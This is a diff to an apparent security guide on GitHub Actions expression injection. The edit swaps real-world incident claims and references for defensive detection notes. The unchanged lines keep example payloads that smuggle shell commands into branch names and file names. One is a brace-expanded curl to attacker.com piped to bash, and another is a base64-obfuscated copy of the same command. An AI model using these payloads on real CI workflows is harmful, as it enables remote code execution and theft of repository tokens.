@@ -8,7 +8,6 @@
 - Where `${{ }}` Is Safe
 - Attacker-Controlled Expressions Quick Reference
 - Exploitation Scenario Template
-- References
 
 ## Overview
 
@@ -58,7 +57,9 @@ Breakdown:
 - `$({curl,-sSfL,attacker.com/steal})` — brace expansion + command substitution
 - The `|${IFS}bash` pipes the download to bash
 
-**Real-world:** Used against microsoft/ai-discovery-agent. The payload was embedded in the branch name, and the 2m38s execution gap in the "Save format request data" step confirmed code execution.
+Branch-name payloads are high signal when the vulnerable step shows unusual
+runtime, unexpected network activity, or output that does not match the normal
+formatting path.
 
 ### Filename Injection
 
@@ -79,7 +80,9 @@ docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IF
 
 The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.
 
-**Real-world:** Used against DataDog/datadog-iac-scanner. Emergency fixes deployed within 9 hours.
+Filename payloads are especially risky in workflows that build shell loops
+from changed-file lists without moving the values through environment
+variables or quoted arrays.
 
 ### PR Title / Body Injection
 
@@ -286,10 +289,3 @@ EXECUTION: Shell interprets ${{ }} output as:
   [show the expanded shell command]
 IMPACT: [RCE, token theft, etc.] — token permissions: [list]
 ```
-
----
-
-## References
-
-- [GitHub Docs: Security hardening — Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
-- [HackerBot Claw — branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
